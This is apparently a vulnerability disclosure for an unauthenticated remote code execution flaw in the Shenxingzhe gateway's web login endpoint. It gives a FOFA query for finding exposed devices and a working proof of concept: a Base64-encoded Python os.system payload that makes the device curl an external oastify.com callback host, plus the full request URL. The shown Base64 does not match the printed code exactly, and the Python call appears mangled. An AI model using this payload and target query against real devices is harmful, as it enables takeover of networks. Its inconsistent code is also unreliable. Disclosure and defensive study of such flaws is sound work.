# The-gateway-of-the-Smart-Walker-is-not-authorized-for-remote-code-execution-RCE-
Unauthenticated Remote Code Execution (RCE) in Shengxingzhe Gateway 
Summary 


FOFA：“cert.sn="9371290284317297864" &&title="网关”
https://fofa.info/
<img width="415" height="240" alt="image" src="https://github.com/user-attachments/assets/c28a17c1-5641-4214-b49e-a426cee27098" />

A critical unauthenticated remote code execution (RCE) vulnerability exists in the Shenxingzhe gateway manufactured by Changsha Tongxun Computer Technology Co., Ltd. An attacker can execute arbitrary system commands on the device without authentication. 
Description 
<img width="1150" height="642" alt="image" src="https://github.com/user-attachments/assets/49720332-125a-44a6-8be3-9682db502029" />
The gateway's web management interface (as shown in the attached image) has a design flaw in its backend logic. A specific function accepts Python code via the sUserCode parameter and executes it. An attacker can craft a request containing malicious code, bypassing authentication, and execute system commands directly on the server. 
Proof of Concept (PoC) 

    Prepare the Payload:
    Encode the following Python command in Base64: 
    python

 
1
import('os').system('curl njaexqxtvfe3h9v3k5jlaei2y14ksbg0.oastify.com')
 
 

The Base64 encoded string is: 
 
eydzVXNlckNvZGU6J2ltcG9ydCgnc29zJykuc3lzdGVtKCdjdXJsIG5qYWV4cXh0dmZlM2g5djNrNWpsYWVpMnl1NGtzYmcwLm9hc3RpZnkuY29tJyk=
 
 

Send the Request:
Send a GET request to the /login?nl.lang=0 endpoint on the target gateway, including the encoded payload in the chkid parameter. 
 
https://<GATEWAY_IP>:4433/login?nl.lang=0&title=1&oip=1&chkid=eydzVXNlckNvZGU6J2ltcG9ydCgnc29zJykuc3lzdGVtKCdjdXJsIG5qYWV4cXh0dmZlM2g5djNrNWpsYWVpMnl1NGtzYmcwLm9hc3RpZnkuY29tJyk=
     
<img width="1746" height="310" alt="image" src="https://github.com/user-attachments/assets/d39169bb-933a-4631-a491-2b45e72ad958" />

(Note: The value of chkid is the Base64 string from step 1) 

Verify Execution:
As shown in the attached image, a DNS query log is observed on the oastify.com service from the target gateway's IP address (172.253.5.18), confirming that the curl command was successfully executed on the device. 
     <img width="830" height="130" alt="image" src="https://github.com/user-attachments/assets/25583a96-23da-40b3-a336-a632d1c2b1a1" />


Impact 

An unauthenticated remote attacker can execute arbitrary system commands on the gateway, leading to complete compromise of the device. This could allow for further lateral movement within the local network. 
Remediation 

Immediate action is required. Disable the web management interface if possible and contact the vendor for an official security patch. The underlying issue stems from the sUserCode parameter functionality, which should be removed or strictly controlled to prevent arbitrary command execution. 
